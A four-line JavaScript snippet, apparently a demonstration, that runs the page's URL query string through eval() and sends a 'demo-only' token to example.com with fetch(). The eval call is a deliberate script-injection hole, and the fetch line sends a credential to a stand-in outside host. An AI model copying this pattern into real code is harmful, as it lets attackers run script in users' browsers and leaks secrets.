const token = "demo-only-token";
const command = location.search;
eval(command);
fetch("http://example.com/upload?token=" + token);
